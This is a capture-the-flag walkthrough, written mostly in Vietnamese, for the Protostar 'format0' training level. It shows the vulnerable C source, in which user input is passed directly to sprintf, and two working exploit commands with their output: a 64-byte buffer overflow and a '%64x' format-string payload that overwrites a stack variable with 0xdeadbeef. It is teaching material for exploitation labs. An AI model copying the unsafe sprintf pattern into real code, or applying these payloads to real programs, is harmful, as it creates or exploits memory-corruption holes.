# FORMAT ZERO

## About

This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

Hints

  * This level should be done in less than 10 bytes of input.
  
  * “Exploiting format string vulnerabilities”

This level is at /opt/protostar/bin/format0

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

## Solutions

`FORMAT ZERO` giới thiệu cho chúng ta về khai thác chuỗi đinh dạng (format string). Input được lấy từ đối số thứ nhất của chương trình argv[1].

Thử thách này có thể vượt qua được với kiểu khai thác buffer overflow.

```
root@protostar:/opt/protostar/bin# ./format0 $(python -c 'print "A" * 64 + "\xef\xbe\xad\xde"')
you have hit the target correctly :)
```

Nhưng thử thách có gợi ý sẽ tốt hơn nếu như chúng ta sử dụng nhỏ hơn 10 bytes đầu vào - nghĩa là khai thác theo đúng mục tiêu thử thách muốn chúng ta học được là khai thác format strings.

`%[parameter][flags][width][.precision][length]type`

Một trong những tùy chọn giữa ký tự `%` và ký tự định dạng `type` là `[width]` - độ dài tối thiểu của dữ liệu được `printf` in ra.

VD: 

```
printf("%18X", 0x12345678);
-> ----------12345678   với '-' thay cho ' ' cho dễ hình dung
```

Bây giờ thì là cách giải quyết `FORMART ZERO` theo chuỗi định dạng.

```
root@protostar:/opt/protostar/bin# ./format0 $(python -c 'print "%64x" + "\xef\xbe\xad\xde"')
you have hit the target correctly :)
```

## Documents

<https://en.wikipedia.org/wiki/Printf_format_string>




